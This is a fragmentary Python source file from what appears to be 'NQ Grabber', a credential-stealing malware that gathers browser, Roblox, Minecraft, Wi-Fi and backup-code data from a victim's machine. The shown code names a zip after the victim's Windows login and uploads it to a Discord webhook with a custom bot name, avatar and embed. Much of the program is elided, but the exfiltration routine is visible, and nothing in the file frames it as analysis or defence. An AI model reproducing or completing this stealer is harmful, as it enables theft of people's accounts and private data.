...
def main(webhook: str):
    ...
    data = {
        "username": "NQ",
        "avatar_url": "https://cdn.discordapp.com/attachments/1071101778273255474/1115580702021390366/a_1b0c5a0163a47496943d1ec2e960d56e.gif"
    }

    _file = f'{localappdata}\\NQ-33-{os.getlogin()}.zip'
    ...
    if __CONFIG__["roblox"] or __CONFIG__["browser"] or __CONFIG__["wifi"] or __CONFIG__["minecraft"] or __CONFIG__["backupcodes"]:
        with open(_file, 'rb') as file:
            encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'NQ-33-{os.getlogin()}.zip', file, 'application/zip')})
...
def zipup():
    _zipfile = os.path.join(localappdata, f'NQ-33-{os.getlogin()}.zip')
            ...
            "embeds": [
                {
                    ...
                    "footer": {
                        "text": "NQ Grabber | Created By XM STORE , NQ"
                    },
                    "thumbnail": {
                        "url": "https://cdn.discordapp.com/attachments/1071101778273255474/1115580702021390366/a_1b0c5a0163a47496943d1ec2e960d56e.gif"
                    }
                }
            ],
            "username": "NQ",
